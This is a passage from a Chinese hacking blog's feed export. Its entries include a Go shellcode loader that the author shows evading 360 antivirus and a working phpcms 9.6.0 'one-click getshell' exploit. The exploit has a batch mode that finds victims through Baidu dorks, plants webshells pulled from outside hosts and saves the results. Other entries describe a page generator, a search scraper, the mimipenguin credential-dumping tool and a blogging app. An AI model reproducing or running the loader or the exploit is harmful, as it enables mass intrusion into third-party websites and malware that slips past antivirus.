class="string">"\x73\x0e\xc3\x4c\xae\x7d\x1c\x7c\x64\xaf\xbb\xce\xa6"</span></span><br><span class="line">    buf += <span class="string">"\x02\x0e\xb1\x51\xc4\x2d\x1b\x6b\xb7\x7c\xd9\x4b\xc3"</span></span><br><span class="line">    buf += <span class="string">"\x8c\x43\xd6\x1b\x2a\x4f\x5e\x0a\x9a\xd5\x4d\x45\x64"</span></span><br><span class="line">    buf += <span class="string">"\x6c\x0c\xc8\xf5\x59\xd7\x45\x36\x85\x99\x8d\x34\x65"</span></span><br><span class="line">    buf += <span class="string">"\x21\xd3\x3b\x35\xce\x22\x29\x0c\x4e\xca\x48\x3f\x55"</span></span><br><span class="line">    buf += <span class="string">"\x5d\x1b\xda\x35\xc1\x2d"</span></span><br><span class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></span><br><span class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></span><br><span class="line">    shellcode := []<span class="keyword">byte</span>(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上就是全部代码<br>其实Golang还有个执行shellcode的方法是不用内联C语言的，但是我这边测试能接到反弹shell，但是执行命令会直接断开，代码我也贴出来<br><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"syscall"</span></span><br><span class="line">    <span class="string">"unsafe"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ThreadExecute</span><span class="params">(Shellcode []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> K32 = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</span><br><span class="line">    <span class="keyword">var</span> CreateThread = K32.MustFindProc(<span class="string">"CreateThread"</span>)</span><br><span class="line">    <span class="keyword">var</span> VirtualAlloc = K32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</span><br><span class="line">    <span class="keyword">var</span> WaitForSingleObject = K32.MustFindProc(<span class="string">"WaitForSingleObject"</span>)</span><br><span class="line"></span><br><span class="line">    Addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)</span><br><span class="line">    AddrPtr := (*[<span class="number">990000</span>]<span class="keyword">byte</span>)(unsafe.Pointer(Addr))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(Shellcode); i++ &#123;</span><br><span class="line">        AddrPtr[i] = Shellcode[i]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ThreadAddr, _, _ := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, Addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    WaitForSingleObject.Call(ThreadAddr, <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>关于断开的原因，希望找出原因的能告知我一下，其实我们会发现，内联C是比较简单的</p>
<h2 id="杀毒测试"><a href="#杀毒测试" class="headerlink" title="杀毒测试"></a>杀毒测试</h2><p>在代码所在目录cmd执行<code>go build</code>得到二进制文件（或者可以用<code>go build -ldflags=&quot;-s -w&quot;</code>减小体积，<code>go build -ldflags=&quot;-H windowsgui -s -w&quot;</code>去掉命令窗口）<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f0e9a00.png" alt=""><br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f8a704c.png" alt=""></p>
<p>可以看到360的静态查杀和动态查杀都没有发现<br>那么是否正常工作呢<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f6d4862.png" alt=""></p>
<p>可以看到完全是没问题的，体积比python编译出来的小的多，编译出来是500多kb，然后经过upx压缩了一下（测试upx压缩后功能依旧正常），降低到了200多kb<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840dbdc23f.png" alt=""></p>
<h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><div class="owl-media owl-video owl-bilibili"><embed src="http://static.hdslb.com/miniloader.swf" flashvars="aid=9975200&page=1" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" quality="high" allowfullscreen="true"></div>]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>自己网盘的页面生成器(私用公开-Golang)</title>
    <url>/2017/04/13/my-yun-generateHTML-with-golang.html</url>
    <content><![CDATA[<p>虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的</p>
<h2 id="关于搭建"><a href="#关于搭建" class="headerlink" title="关于搭建"></a>关于搭建</h2><p>这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）<br><a id="more"></a></p>
<h2 id="关于页面的生成"><a href="#关于页面的生成" class="headerlink" title="关于页面的生成"></a>关于页面的生成</h2><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>那时候只有两三个文件，html页面是我手写的手动增加的</p>
<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>此时已经有了一个子目录，文件开始增多，我开始考虑写个简单的先用着，Python的写了，不过速度感觉有点不如意（原谅我的吹毛求疵）,并且有个麻烦事是每次重装系统后需要安装Python，然后我选用了Golang，时间仓促写了一个单页面生成，不进行目录深度遍历的，也就是说我每次新开一个目录需要把这个程序拷贝到当目录下双击生成html</p>
<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><p>文件夹和文件日益增多，上面的方式我已经感觉到特别繁琐了，需要找个机会把代码重构一下，使他更加优化<br>然后我开始着手写第二版，这个版本我没保留，具体功能就是对上一个版本做了一点改进，使它支持了深度遍历<br>但是自从<strong>T00ls灵车漂移事件以来，官方管理员给<em>GetWriter</em>老哥（如果谁认识希望告知，希望能致个歉）的一纸封书将此事推上风口浪尖，作为始作俑者，我网站首当其冲，遭受了大量老哥多来自夜间的洗礼（说实话，希望高抬贵手，流量快没了）</strong>，这件事情持续发酵了两三天，我一直在思考，如何为老哥们带来更良好的观感体验，于是我觉得应该要让这个页面生成器对前端展示的修改更加方便，无须从代码入手，开始了第三版的编写</p>
<h4 id="暂时实现的功能"><a href="#暂时实现的功能" class="headerlink" title="暂时实现的功能"></a>暂时实现的功能</h4><ul>
<li>支持模板</li>
<li>加入了配置文件（其实也是模板）</li>
<li>加入了noView.txt规则（具体表现为这个txt中的文件名将不参与生成html页面）<br>可能以后会抽时间再进行优化，这个时间不定，看哪天自己的需求更高了</li>
</ul>
<h2 id="更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看"><a href="#更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看" class="headerlink" title="更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看"></a>更新记录在下面，更新后的代码就不贴了，<strong>之前的代码我就在这个页面上删了</strong>，自己感兴趣可以上github查看</h2><h2 id="至于前端"><a href="#至于前端" class="headerlink" title="至于前端"></a>至于前端</h2><p><del>你们别想了，前端之魂在我体内没存在过，哪天兴致来了可能会看看相关知识，这个丑页面就丑着凑合看吧，如果有能力可以进行二次修改</del></p>
<p><strong>为它搞了一套css与文件类型图标</strong>（关于style.css文件，是需要你放到远端在线调用的，你可以上传到七牛，或者你同步的时候放到网站根目录下，然后通过域名+/style.css的方式来调用）</p>
<h2 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h2><ul>
<li>对一部分冗余的进行了优化，提升了一丁点效率</li>
<li>可以放到环境变量path了，不需要放到本目录里了，只需要在本目录调用就可以（当然），按照之前的方法也是可以的</li>
</ul>
<hr>
<ul>
<li>对文件li列表做了排序，优先级为后缀名-&gt;文件名</li>
<li>对li列表加了css类，可以自定义li的css了，具体见生成后的文件</li>
<li>为页面生成器搞了一套css，为类型加上了图标，具体效果见下图<br><img src="https://ooo.0o0.ooo/2017/04/14/58f0f09499fda.png" alt="snipaste_20170414_235335.png"></li>
</ul>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>这次不能给抓住机会了，放github吧</p>
<ul>
<li><a href="https://github.com/akkuman/generateIndexHTML" target="_blank" rel="noopener">代码下载地址</a></li>
<li><a href="https://github.com/akkuman/generateIndexHTML/bin" target="_blank" rel="noopener">二进制文件下载地址</a></li>
</ul>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>百度搜索引擎取真实地址-python代码</title>
    <url>/2017/04/11/BaiduSearch-get-realUrl-with-python.html</url>
    <content><![CDATA[<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></span><br><span class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></span><br><span class="line">    pnum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</span><br><span class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request = requests.get(baseURL, headers=headers)</span><br><span class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</span><br><span class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</span><br><span class="line">                <span class="keyword">yield</span> url</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            pnum += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="示例用法"><a href="#示例用法" class="headerlink" title="示例用法"></a>示例用法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> parseBaidu(<span class="string">"keyword"</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> url:</span><br><span class="line">            print(url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>phpcms9-6-0 一键getshell工具</title>
    <url>/2017/04/10/phpcms9-6-0-getshell-with-python.html</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li>一键化<code>python 1.py http://xxx.com</code>,如果是批量直接运行py文件即可</li>
</ul>
<h2 id="待办"><a href="#待办" class="headerlink" title="待办"></a>待办</h2><ul>
<li>[] 加入对有验证码phpcms网站的支持</li>
<li>[] 加入批量(<strong>已完成</strong>)</li>
</ul>
<a id="more"></a>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>依赖库的安装<code>pip install requests</code></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">Author : Akkuman</span></span><br><span class="line"><span class="string">Blog   : hacktech.cn</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">"[*]Usage   : Python 1.py http://xxx.com"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"dsakkfaffdssdudi"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</span><br><span class="line">        <span class="string">"email"</span>: <span class="string">"dsakkfddsjdi@qq.com"</span>,</span><br><span class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</span></span><br><span class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"</span>,</span><br><span class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</span><br><span class="line">        data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</span><br><span class="line">        data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</span><br><span class="line">        </span><br><span class="line">        htmlContent = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        successUrl = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</span><br><span class="line">            successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></span><br><span class="line">            print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</span><br><span class="line">        <span class="keyword">if</span> successUrl == <span class="string">""</span>:</span><br><span class="line">            print(<span class="string">"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Request Error"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">Author : Akkuman</span></span><br><span class="line"><span class="string">Blog   : hacktech.cn</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># from urlparse import unquote //Python2</span></span><br><span class="line"><span class="comment"># from urlparse import urlparse //Python2</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></span><br><span class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></span><br><span class="line">    pnum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</span><br><span class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request = requests.get(baseURL, headers=headers)</span><br><span class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</span><br><span class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</span><br><span class="line">                <span class="keyword">yield</span> url</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            pnum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveShell</span><span class="params">(shellUrl)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"webShell.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">"[*]%s\n"</span> % shellUrl)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"akkumandsad"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</span><br><span class="line">        <span class="string">"email"</span>: <span class="string">"akkakkumafa@qq.com"</span>,</span><br><span class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt</span></span><br><span class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg&gt;"</span>,</span><br><span class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> crawlUrl <span class="keyword">in</span> parseBaidu(<span class="string">"inurl:index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> crawlUrl:</span><br><span class="line">                rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</span><br><span class="line">                data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</span><br><span class="line">                data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</span><br><span class="line">                host = urlparse(crawlUrl).scheme + <span class="string">"://"</span> + urlparse(crawlUrl).hostname</span><br><span class="line">                url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></span><br><span class="line">                htmlContent = requests.post(url, data=data, timeout=<span class="number">10</span>)</span><br><span class="line">                successUrl = <span class="string">""</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</span><br><span class="line">                    successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></span><br><span class="line">                    print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</span><br><span class="line">                    saveShell(successUrl)</span><br><span class="line">                <span class="keyword">if</span> successUrl == <span class="string">""</span>:</span><br><span class="line">                    print(<span class="string">"[x]Failed : Failed to getshell."</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"Request Error"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><h3 id="单个"><a href="#单个" class="headerlink" title="单个"></a>单个</h3><p><img src="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png" alt="TIM图片20170410191951.png"></p>
<h3 id="批量-1"><a href="#批量-1" class="headerlink" title="批量"></a>批量</h3><p><img src="https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png" alt="TIM图片20170410225257.png"></p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://file.codecat.one/phpcms/" target="_blank" rel="noopener">代码下载地址</a></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>抓取当前登录用户登录密码的工具：mimipenguin</title>
    <url>/2017/04/02/mimipenguin.html</url>
    <content><![CDATA[<p><strong><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">Github项目地址</a></strong></p>
<p>前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。<br>编写思路来自流行的<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">windows密码抓取神器mimikatz</a><br><a id="more"></a><br><img src="https://ooo.0o0.ooo/2017/04/06/58e5a6e8ac47f.png" alt=""></p>
<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><p>通过转储过程和提取那些包含明文密码可能性很高的行（hang），充分利用内存中的明文凭证。通过检查/etc/shadow文件hash,内存中的hash和正则匹配去尝试计算出每个单词的概率</p>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><ul>
<li>root权限</li>
</ul>
<h2 id="已支持-以下环境已通过测试"><a href="#已支持-以下环境已通过测试" class="headerlink" title="已支持(以下环境已通过测试)"></a>已支持(以下环境已通过测试)</h2><ul>
<li>Kali 4.3.0 (rolling) x64 (gdm3)</li>
<li>Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>VSFTPd 3.0.3-8+b1 (Active FTP client connections)</li>
<li>Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) [Gcore dependency]</li>
<li>openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage)</li>
</ul>
<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><ul>
<li>在内存中的密码 - 100%有效</li>
<li>计划扩大支持和其他凭证位置</li>
<li>努力扩展到非桌面环境</li>
<li>已知bug - 有时gcore会挂起脚本，不过这是gcore导致的问题</li>
<li>开放提出请求和社区研究</li>
<li>计划未来的LDAP研究（nscld winbind等）</li>
</ul>
<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><ul>
<li>Twitter: <a href="https://twitter.com/HunterGregal" target="_blank" rel="noopener">@huntergregal</a></li>
<li>个人站点: <a href="http://huntergregal.com/" target="_blank" rel="noopener">huntergregal.com</a></li>
<li>Github: <a href="https://github.com/huntergregal" target="_blank" rel="noopener">huntergregal</a></li>
</ul>
<h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><ul>
<li>the-useless-one for remove Gcore as a dependency, cleaning up tabs, and adding output option</li>
<li>gentilkiki for Mimikatz, the inspiration and the twitter shoutout</li>
<li>pugilist for cleaning up PID extraction and testing</li>
<li>ianmiell for cleaning up some of my messy code</li>
<li>w0rm for identifying printf error when special chars are involved</li>
<li>benichmt1 for identifying multiple authenticate users issue</li>
<li>ChaitanyaHaritash for identifying special char edge case issues</li>
</ul>
<p>转载自<a href="https://github.com/huntergregal/mimipenguin/blob/master/README.md" target="_blank" rel="noopener">mimipenguin</a></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>推荐一个静态博客兼笔记的工具：WDTP</title>
    <url>/2017/04/01/Walden-Tips-Introdution.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WDTP（山湖录）不止是一款开源免费的GUI桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、录音、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验的Markdown文本编辑器和一款方便强大的录音机。本软件研发的核心思想是：<strong>简洁高效、轻灵优雅、先进强悍、操作简单</strong>。</p>
<a id="more"></a>
<p><img src="http://underwaysoft.com/works/wdtp/media/wdtp-main.jpg" alt=""></p>
<p>WDTP（山湖录）可运行于macOS和Windows系统下，旨在提高这两大平台下所有写作/分享者的生产力及生产效率，节约耗时，减少无谓的智能、体力与资源消耗。它适合于以下群体：</p>
<ul>
<li>以<strong>文字、声音、图片、视频为主要内容</strong>的写作/记录/创作/分享者</li>
<li>职业或业余作家、小说家、编剧、技术类图书的作者及编撰者</li>
<li>经常记笔记或写点东西的人</li>
<li>写作极客</li>
<li>打算采用静态页面的个人博客</li>
<li>打算采用静态页面的中小企业<br>WDTP的全名是：<strong>Walden Tips</strong>，中文名称：<strong>山湖录</strong>，UnderwaySoft开发出品。设计、编程及维护：SwingCoder。立项日期：2016年8月2日，第一个内测版发布日期：2017年2月3日。</li>
</ul>
<h2 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h2><ul>
<li>创作。对职业作家（特别是技术作家以及需要大量构思与情节编排的文艺作家）来说比Pages、Word等WYSWYG类型的桌面文字软件更加高效、简洁和灵活的内容创作、章节管理与格式化排版工具。可方便地实现多章节（情节、场景、概念、故事主线等）并发创作/编辑、任意调序、随意归类等强大功能，完稿后一键即可成书。</li>
<li>笔记。可随时记录并管理学习笔记、读书笔记以及有一定篇幅并打算结构化保存、管理、检视和封装的零星随记、杂感等等。可定期将所有或任意分类（目录）下的笔记“装订成册”、集中输出，一键即可完成。</li>
<li>建站。强大而新颖的静态网站维护、编辑、生成、代码调试与内容、结构管理系统。特别适合追求全站真正静态化、内容至上的个人博客与中小企业官网。</li>
<li>Markdown编辑器。在保留并规范了大部分“正统”Markdown语法的基础上，WDTP根据大多数作者/作家的实际需求，增加了一批非常实用的新文本标记语法。比如：插入图注和表注、居中、靠右、多种类型的表格、图文混排、插入音视频媒体文件、内容注释、跨文档扩展标记等等。该编辑器针对Windows系统和macOS系统（非Retina显示屏）对中文字体的渲染结果不尽人意等情况专门做了特殊优化与调整，使用户在输入、编辑时可获得更良好的体验。</li>
<li>以上几项，不仅可以文字输入，更可以语音输入，直接记录声音。这一点对不擅长文字表达的朋友或者记者、演员、各类主持人、音乐家、演奏家等群体来说非常方便。</li>
